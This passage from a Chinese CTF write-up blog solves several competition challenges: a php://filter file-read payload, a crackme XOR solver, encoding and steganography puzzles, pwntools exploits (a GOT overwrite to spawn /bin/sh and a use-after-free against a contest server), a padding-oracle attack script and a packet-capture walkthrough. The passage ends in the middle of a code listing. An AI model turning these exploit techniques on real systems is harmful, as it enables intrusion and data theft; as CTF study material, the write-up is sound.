<code>preg_match(&quot;/^php:\/\/.*resource=([^|]*)/i&quot;, trim($id), $matches);</code> ，于是采用 php://filter 进行读取文件，联系到上面的 <code>flag.php</code>,于是 <code>id=php://filter/read=jpg/resource=flag.php</code>，拿到 flag</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/13290343.jpg" alt=""></p><h1 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h1><p>比较简单的应该逆向题目<br>运行程序，然后附加<br>这个时候已经出现了</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/55451041.jpg" alt=""></p><p>上面这样的字符串，我们在程序中搜索，并在关键跳转比较的地方下好断点</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/65243748.jpg" alt=""></p><p>可以看到一个比较字符串长度的地方</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/71910154.jpg" alt=""></p><p>所以我们的输入应该是长度为42的字符串</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/50494136.jpg" alt=""></p><p>我们的输入与 <code>this_is_not_flag</code> 按位循环异或，然后与</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66493764.jpg" alt=""></p><p>eax*n+401250比较，我们查看这块内存</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/4110967.jpg" alt=""></p><p>每一位n就会eax的值就会+1 所以刚好对应下面的42给字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">'this_is_not_flag'</span></span><br><span class="line">num = [<span class="number">0x12</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x3d</span>, <span class="number">0x56</span>, <span class="number">0xa</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x46</span>, <span class="number">0x5a</span>, <span class="number">0x44</span>, <span class="number">0x42</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x44</span>, <span class="number">0x72</span>, <span class="number">0xc</span>, <span class="number">0xd</span>, <span class="number">0x40</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0x5f</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x4c</span>, <span class="number">0x5e</span>, <span class="number">0x5b</span>, <span class="number">0x17</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x16</span>, <span class="number">0x68</span>, <span class="number">0x5b</span>, <span class="number">0x12</span>]</span><br><span class="line"></span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">    n = i%<span class="number">16</span></span><br><span class="line">    flag += str(chr(ord(key[n])^num[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="juckcode"><a href="#juckcode" class="headerlink" title="juckcode"></a>juckcode</h1><p>类base64</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/49828264.jpg" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/68120400.jpg" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/19403609.jpg" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = file(<span class="string">'flag.enc'</span>).read().strip()</span><br><span class="line">data1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    data1 += chr(ord(i)<span class="number">-0x10</span>)</span><br><span class="line">data1 = data1.decode(<span class="string">'hex'</span>)</span><br><span class="line">bd = base64.b64encode(data1)</span><br><span class="line">t1 = string.uppercase+string.lowercase+string.digits+<span class="string">r'+/'</span></span><br><span class="line">t2=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t1:</span><br><span class="line">    t2 += chr(ord(i)<span class="number">-10</span>)</span><br><span class="line">table1 = string.maketrans(t1,t2)</span><br><span class="line">table2 = string.maketrans(t2,t1)</span><br><span class="line">bd1 = bd.translate(table1)</span><br><span class="line">s=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bd1)/<span class="number">4</span>):</span><br><span class="line">    s += bd1[<span class="number">4</span>*i]</span><br><span class="line">bd2 = s.translate(table2)</span><br><span class="line">n = <span class="number">3</span>-len(bd2)%<span class="number">3</span></span><br><span class="line">bd2 += <span class="string">'='</span>*n</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(bd2)</span><br></pre></td></tr></table></figure><h1 id="登机牌"><a href="#登机牌" class="headerlink" title="登机牌"></a>登机牌</h1><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/84157457.jpg" alt=""></p><p>在图片的末尾发现rar字样，扣出来，并且加上rar的头</p><p>这是一个rar压缩包，然而加密了</p><p>重新找线索，之前二维码利用过了，没什么其他信息，然而，条形码还没用过</p><p>反色扫描</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/86192358.jpg" alt=""></p><p>得到key 后面的数字就是密码了  解压得到flag</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66798604.jpg" alt=""></p><h1 id="list"><a href="#list" class="headerlink" title="list"></a>list</h1><p>题目比较简单，表面看是堆利用的题目，但是其实和堆没什么关系。就是把申请到的chunk的指针依次放入到一个chunk_table中，然后增加chunk数量的索引值。<br>漏洞出现在Delete函数上，<br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/8099462.jpg" alt=""><br>可以发现，其实并没有free掉chunk，只是把之前申请到的chunk数量的索引值，做了一个简单的减法。<br>所以可以一直调用Delete函数，不断的去减少这个索引值，也就说这个索引值可以变成负数，那么就可以索引到我的chunk_table地址之前的任何一个地址。接下来调用Show函数和Edit函数就能按照索引到的这个地址存储的指针来泄漏和修改。<br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/60393945.jpg" alt=""><br>接下来要想修改GOT表，那么需要我索引到的地址中存了一个GOT表地址，发现确实是有这种地址。<br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/2124193.jpg" alt=""><br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/66882215.jpg" alt=""><br>也就是说调用Delete函数263007次之后，就能索引到 0x602080 - 8*263007 =0x400588 这个地址，接下来调用Show函数和Edit函数就能泄漏libc，并且修改GOT表了。把这里改成system函数的地址就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./list'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#io = remote('106.75.8.58', 13579)</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your content:\n'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">263007</span>):</span><br><span class="line">    <span class="comment">#print x</span></span><br><span class="line">    Delete()</span><br><span class="line"></span><br><span class="line">Show()</span><br><span class="line">content = io.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">libc_base = u64(content.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">log.info(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">Edit(p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="p200"><a href="#p200" class="headerlink" title="p200"></a>p200</h1><p>uaf 控制指针到后门的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./p200"</span>)</span><br><span class="line">io=remote(<span class="string">"106.75.8.58"</span>,<span class="number">12333</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Please input the length:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"48"</span>)</span><br><span class="line">io.sendline(<span class="string">"a"</span>*<span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Please input the length:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"48"</span>)</span><br><span class="line">io.sendline(p64(<span class="number">0x602d90</span>)+<span class="string">"mdzzdmzxzasas"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="Is-aes-secure"><a href="#Is-aes-secure" class="headerlink" title="Is_aes_secure"></a>Is_aes_secure</h1><p>Padding oracal</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ct = <span class="string">'4141414141414141414141414141414173f880342a533d069b3d2c33ea2c452aaac1cdf6ccb81e51f081a90ea411fe9edbd6bf6de7bab502dabdb9c51b7fb490'</span></span><br><span class="line">printable_chars = range(<span class="number">32</span>, <span class="number">128</span>) + range(<span class="number">5</span>,<span class="number">17</span>)</span><br><span class="line">padding_chars = range(<span class="number">1</span>, <span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(cipher, conn)</span>:</span></span><br><span class="line">    cipher = cipher.decode(<span class="string">'hex'</span>)</span><br><span class="line">    conn.send(<span class="string">'3\n'</span>)</span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send((<span class="string">'A'</span>*<span class="number">16</span>).encode(<span class="string">'base64'</span>))</span><br><span class="line"></span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send(cipher.encode(<span class="string">'base64'</span>))</span><br><span class="line">    <span class="keyword">if</span> conn.recv() == <span class="string">'Decrpytion Done\n'</span>:</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2hex</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="string">'''整数转成十六进制，返回字符串形式，xx，这种方法要记下来放到日志'''</span></span><br><span class="line">    <span class="keyword">return</span> hex(i)[<span class="number">2</span>:] <span class="keyword">if</span> len(hex(i)[<span class="number">2</span>:]) == <span class="number">2</span> <span class="keyword">else</span> <span class="string">'0'</span> + hex(i)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_pad</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="string">'''输入一个1~16整数，返回一个长度16Byte，前导0，后面用i进行padding的字符串'''</span></span><br><span class="line">    <span class="keyword">assert</span>(i &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(i &lt;= <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">'00'</span> * (<span class="number">16</span> - i) + int2hex(i) * i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_g</span><span class="params">(g, pos)</span>:</span></span><br><span class="line">    <span class="string">'''输入guess值，还有需要异或的位置(0~15)，返回一个长度16的前导0、后缀0、中间某一Byte为guess值的字符串'''</span></span><br><span class="line">    <span class="keyword">assert</span>(pos &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(pos &lt; <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'00'</span> * (<span class="number">15</span> - pos) + int2hex(g) + <span class="string">'00'</span> * pos</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refill_zero</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">'''填充前导0，返回长度32的字符串'''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0'</span> * (<span class="number">32</span> - len(s)) + s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">'''xor two strings of different lengths'''</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexexor</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    <span class="string">'''输入的是两个字符串，输出他们异或后的字符串'''</span></span><br><span class="line">    <span class="comment"># 先decode，将字符串转成Byte数据类型，再异或，异或结果后重新编码为字符串</span></span><br><span class="line">    <span class="keyword">return</span> strxor(s1.decode(<span class="string">"hex"</span>), s2.decode(<span class="string">"hex"</span>)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span><span class="params">()</span>:</span></span><br><span class="line">    conn = remote(<span class="string">'106.75.98.74'</span>,<span class="number">10010</span>)</span><br><span class="line">    cipher = <span class="string">"c/iANCpTPQabPSwz6ixFKqrBzfbMuB5R8IGpDqQR/p7b1r9t57q1Atq9ucUbf7SQ"</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_a_byte</span><span class="params">(conn, found_msg, pos, dictinary_, iv, ct, is_padding = False)</span>:</span></span><br><span class="line">    <span class="comment"># 功能：穷举一个字节，破解得到明文</span></span><br><span class="line">    <span class="comment"># 输入found_msg为之前已经找到的字符串</span></span><br><span class="line">    <span class="comment"># pos为需要穷举的字节位置：从后开始计数1~16</span></span><br><span class="line">    <span class="comment"># dicitionay为穷举字典：int型范围0~255</span></span><br><span class="line">    <span class="comment"># iv为需要进行异或的字符串，ct为待解密的密文</span></span><br><span class="line">    <span class="comment"># is_padding是检查密文的Padding有效性时候用到，默认false</span></span><br><span class="line">    pad = exor_pad(pos)</span><br><span class="line">    lastmsg = refill_zero(found_msg.encode(<span class="string">"hex"</span>))</span><br><span class="line">    getletter = <span class="keyword">False</span></span><br><span class="line">    possible_padding = []</span><br><span class="line">    <span class="comment"># 字典破解，我有两个字典：ascii字符和padding集合</span></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> dictinary_:</span><br><span class="line">        gpad = exor_g(guess, pos - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 是把猜想值和lastmsg做异或运算，能否破解成功依赖Lastmsg的正确性。</span></span><br><span class="line">        <span class="keyword">if</span> query(hexexor(lastmsg, hexexor(iv, hexexor(gpad, pad))) + ct, conn):</span><br><span class="line">            getletter = <span class="keyword">True</span></span><br><span class="line">            new_msg = int2hex(guess).decode(<span class="string">"hex"</span>) + found_msg</span><br><span class="line">            <span class="keyword">if</span> is_padding:</span><br><span class="line">                possible_padding.append(guess)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> new_msg</span><br><span class="line">    <span class="keyword">if</span> is_padding:</span><br><span class="line">        <span class="keyword">return</span> possible_padding</span><br><span class="line">    <span class="keyword">if</span> getletter == <span class="keyword">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    conn = getConSec()</span><br><span class="line">    blocks = ()   <span class="comment"># 含四个元素，每个元素是长度32的字符串，使用tuple的目的是“不可变”的特性</span></span><br><span class="line">    <span class="keyword">while</span> ct:</span><br><span class="line">        blocks = blocks + (ct[:<span class="number">32</span>],)</span><br><span class="line">        ct = ct[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    b = input(<span class="string">"input block number to crack:\n#(1~3)"</span>)</span><br><span class="line">    iv = blocks[b - <span class="number">1</span>]   <span class="comment"># 截取待破解的前一个block作为IV，其他block都可以丢弃了</span></span><br><span class="line">    block = blocks[b]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试最后字节的Padding是否有效</span></span><br><span class="line">    is_last_block = <span class="keyword">False</span></span><br><span class="line">    <span class="comment"># if b == 3:</span></span><br><span class="line">    <span class="comment">#     is_last_block = True</span></span><br><span class="line">    <span class="keyword">if</span> is_last_block:</span><br><span class="line">        possible_paddings = test_a_byte(conn, <span class="string">''</span>, <span class="number">1</span>, padding_chars, iv, block, <span class="keyword">True</span>)</span><br><span class="line">        <span class="comment"># 测试经过第一轮筛选处理的padding是否有效</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> possible_paddings:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"possible padding size is:"</span>, i</span><br><span class="line">            msg = chr(i) * i</span><br><span class="line">            start_byte = i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> test_a_byte(conn, msg, start_byte, printable_chars, iv, block) != <span class="keyword">None</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"good padding size is:"</span>, i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg = <span class="string">''</span></span><br><span class="line">        start_byte = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对选定的block进行16字节的逐个字节破解</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(start_byte, <span class="number">17</span>):</span><br><span class="line">        is_found = test_a_byte(conn, msg, pos, printable_chars, iv, block)</span><br><span class="line">        <span class="keyword">if</span> is_found:</span><br><span class="line">            msg = is_found</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%r"</span> % msg</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"can't found the last #%d byte"</span> % pos</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> is_last_block <span class="keyword">and</span> msg:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"After cutting padding off, the last block is:\n%r"</span> % msg[:-(start_byte - <span class="number">1</span>)]</span><br></pre></td></tr></table></figure><h1 id="clemency"><a href="#clemency" class="headerlink" title="clemency"></a>clemency</h1><p>hitcon国内参赛选手提过的一个架构<br>9bit代替了8bit<br>在github找了个ida插件</p><p><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/64717057.jpg" alt=""></p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol><li>搜索flag关键字，发现在一个ftp包中含有flag.zip等字样</li></ol><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/75747794.jpg" alt=""></p><ol><li>过滤得到ftp完整通信流程将传输的zip文件导出，有密码的压缩包，里面是flag.txt</li></ol><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/13131227.jpg" alt=""></p><ol><li>通过ftp||ftp-data过滤将key.log导出</li></ol><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/2601669.jpg" alt=""></p><ol><li>导入key.log为ssl证书</li></ol><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/26430276.jpg" alt=""></p><ol><li>导入http对象</li></ol><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/17178874.jpg" alt=""></p><ol><li>打开后为压缩包含mp3，进行分析</li></ol><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11020176.jpg" alt=""></p><p>用这个密码去解压压缩包得到flag  flag{4sun0_y0zora_sh0ka1h@}</p><h1 id="rrrsa"><a href="#rrrsa" class="headerlink" title="rrrsa"></a>rrrsa</h1><p>hash扩展攻击 ，让用户名里出现root，然后就可以再生成一对ed，同时能看到老的ed，如果两次e相同，那就相当于拿到d了，然后请求一次密文就ok</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 